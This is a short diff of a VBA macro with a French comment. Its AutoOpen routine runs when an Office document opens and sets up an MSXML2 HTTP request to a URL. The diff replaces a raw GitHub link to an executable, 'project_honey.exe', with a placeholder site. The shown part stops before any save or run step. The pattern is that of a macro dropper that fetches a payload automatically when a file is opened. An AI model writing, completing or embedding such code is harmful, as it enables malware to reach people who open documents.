@@ -1,7 +1,7 @@
 Sub AutoOpen()
 
     Dim myURL As String
-    myURL = "https://raw.githubusercontent.com/julienmorrue/project-honey/main/project_honey.exe"
+    myURL = "https://websitexxxxxx.com"
 
     Dim WinHttpRequest As Object
     Set WinHttpRequest = CreateObject("MSXML2.XMLHTTP") ' Utilisation de MSXML2 pour mieux gérer HTTPS
